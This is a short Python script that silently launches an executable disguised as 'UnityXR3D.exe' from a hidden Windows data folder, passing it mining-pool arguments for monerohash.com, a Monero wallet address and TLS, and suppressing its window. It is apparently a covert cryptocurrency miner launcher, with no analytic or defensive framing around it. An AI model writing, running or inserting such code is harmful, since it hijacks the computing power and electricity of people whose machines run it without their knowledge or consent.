import subprocess

path_to_UnityXR3D = "C:/windows_data/data_log/UnityXR3D.exe"

mining_level = 1

command = [
    path_to_UnityXR3D,
    "-o", "monerohash.com:9999",
    "-u", "47E3dzvFXcNc7yjaCR6GKF8DqayopyfWv5yKgo5eJSG4EFrDtXhxzTsDKhTkM8W1zsgsJJtvXJi2sM8o5t4wgNdXEz2N8A7",
    "-k", "--tls",
    "-m", str(mining_level)
]


subprocess.Popen(command, creationflags=subprocess.CREATE_NO_WINDOW)
